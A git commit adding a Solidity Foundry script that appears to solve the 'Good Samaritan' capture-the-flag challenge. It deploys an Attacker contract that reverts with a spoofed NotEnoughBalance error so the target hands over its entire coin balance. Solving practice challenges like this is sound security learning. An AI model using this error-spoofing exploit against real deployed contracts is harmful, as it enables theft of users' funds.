492d9e3622f95449b20a404a28647581994bd2a8
hazem-dh <58445913+Hazem-dh@users.noreply.github.com>
2026-01-10 01:28:03 +0100

    Solved good Samaritan

---
+++ script/SolveGoodSamaritan.s.sol
@@ -0,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import {Script} from "forge-std/Script.sol";
+import {GoodSamaritan, Coin} from "../src/GoodSamaritan.sol";
+
+// Define the custom error
+error NotEnoughBalance();
+
+contract Attacker {
+    GoodSamaritan public goodSamaritan;
+    Coin public coin;
+
+    constructor(address _goodSamaritan) {
+        goodSamaritan = GoodSamaritan(_goodSamaritan);
+        coin = goodSamaritan.coin();
+    }
+
+    function notify(uint256 amount) external {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
+    }
+
+    function attack() external {
+        goodSamaritan.requestDonation();
+    }
+}
+
+contract SolveGoodSamaritan is Script {
+    GoodSamaritan public goodSamaritan;
+
+    function setUp() public {}
+
+    function run() public {
+        vm.startBroadcast();
+
+        goodSamaritan = GoodSamaritan(
+            payable(vm.envAddress("GOODSAMARITAN_ADDRESS"))
+        );
+
+        Attacker attacker = new Attacker(address(goodSamaritan));
+        attacker.attack();
+
+        vm.stopBroadcast();
+    }
+}
